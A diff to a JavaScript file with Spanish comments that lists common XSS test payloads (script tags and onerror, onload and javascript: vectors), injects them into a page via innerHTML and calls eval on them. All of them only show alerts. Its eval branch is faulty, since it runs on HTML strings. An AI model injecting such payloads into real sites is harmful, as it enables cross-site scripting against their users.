@@ -1,8 +1,27 @@
-// Crear un nuevo elemento script
-const script = document.createElement('script');
+// xss_payload_js.js
 
-// Definir la carga útil de XSS
-script.innerHTML = "alert('XSS Vulnerability Detected');";
+// Lista de cargas útiles de XSS
+const xssPayloads = [
+    "<script>alert('XSS1')</script>",
+    "<img src='x' onerror='alert(\"XSS2\")'>",
+    "<svg onload='alert(\"XSS3\")'></svg>",
+    "<body onload='alert(\"XSS4\")'></body>",
+    "<iframe src='javascript:alert(\"XSS5\")'></iframe>",
+    "alert('XSS')"
+];
 
-// Añadir el script al cuerpo del documento para ejecutarlo
-document.body.appendChild(script);
+// Función para intentar ejecutar cada carga útil
+xssPayloads.forEach(payload => {
+    try {
+        const div = document.createElement('div');
+        div.innerHTML = payload;
+        document.body.appendChild(div);
+
+        // Si la carga útil es solo un alert, ejecutarla directamente
+        if (payload.includes('alert')) {
+            eval(payload);
+        }
+    } catch (e) {
+        console.error('Error ejecutando la carga útil:', payload, e);
+    }
+});
